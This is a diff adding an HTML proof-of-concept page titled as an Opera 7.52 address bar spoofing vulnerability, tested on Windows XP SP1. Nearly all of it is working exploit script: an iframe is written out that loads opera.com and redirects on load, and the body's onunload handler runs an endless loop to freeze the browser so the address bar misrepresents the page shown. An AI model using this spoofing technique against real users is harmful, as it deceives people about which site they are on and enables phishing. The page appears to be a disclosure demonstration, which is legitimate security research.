@@ -1,0 +1,42 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+<meta http-equiv="Content-Script-Type" content="text/javascript">
+<meta http-equiv="Content-Style-Type" content="text/css">
+<title>Opera 7.52 Address Bar Spoofing Vulnerability</title>
+<style type="text/css">
+<!-- /* begin */
+ h1 { font-size:120%;}
+ h2 { font-size:100%;}
+/* end */ -->
+</style>
+<script type="text/javascript">
+<!--
+function urlfake(){
+location.href="http://www.microsoft.com/";
+}
+function preinline () {
+myvar = '<iframe onload="urlfake()" ';
+myvar = myvar +  'title="preload inline frame" ';
+myvar = myvar + 'src="http://www.opera.com/" ';
+myvar = myvar +  'frameborder="0" width="760" height="1800" ';
+myvar = myvar +  'marginwidth="0" marginheight="0">';
+myvar = myvar +  '<' + '/iframe>';
+document.write (myvar);
+}
+// -->
+</script>
+</head>
+<body onunload="while(1){};">
+<h1>Opera Browser 7.52 (Build 3834) Address Bar Spoofing Issue</h1>
+<h2>Tested on WindowsXP SP1</h2>
+<p>
+<script type="text/javascript">
+<!--
+preinline ();
+// -->
+</script>
+</p>
+</body>
+</html>
